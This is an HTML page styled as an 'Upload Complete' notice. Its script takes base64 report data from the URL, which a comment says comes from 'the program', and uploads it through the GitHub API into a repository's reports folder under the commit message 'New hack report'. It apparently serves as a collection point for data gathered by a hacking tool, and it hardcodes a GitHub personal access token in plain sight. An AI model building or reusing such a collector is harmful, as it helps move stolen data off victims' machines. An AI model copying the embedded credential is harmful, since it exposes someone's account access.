<!DOCTYPE html>
<html>
<head>
  <title>Upload Complete</title>
  <style>
    body{font-family:Arial;background:#000;color:#0f0;text-align:center;padding:60px;}
    .box{background:#111;padding:40px;border:2px solid #e74c3c;border-radius:16px;max-width:500px;margin:0 auto;}
    h2{color:#e74c3c;}
  </style>
</head>
<body>
<div class="box">
  <h2>Upload Complete!</h2>
  <p>Report sent to Admin Panel.</p>
  <p><a href="https://youssefmettwaly.github.io/tero-report/index.html" style="color:#0f0;">Go to Admin Panel</a></p>
</div>

<script>
// === الـ Token مخفي هنا فقط ===
const GITHUB_TOKEN = "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";
const REPO = "youssefmettwaly/tero-report";
const API_URL = `https://api.github.com/repos/${REPO}/contents/reports`;

// استقبال التقرير من البرنامج
const params = new URLSearchParams(location.search);
const data = params.get('data');
if (data) {
  try {
    const content = atob(data);
    const filename = `report_${new Date().toISOString().replace(/[:.]/g,'-')}_${navigator.userAgent.slice(0,15)}.txt`;

    fetch(`${API_URL}/${filename}`, {
      method: 'PUT',
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: 'New hack report',
        content: btoa(content),
        branch: 'main'
      })
    });
  } catch(e) {}
}
</script>
</body>
</html>

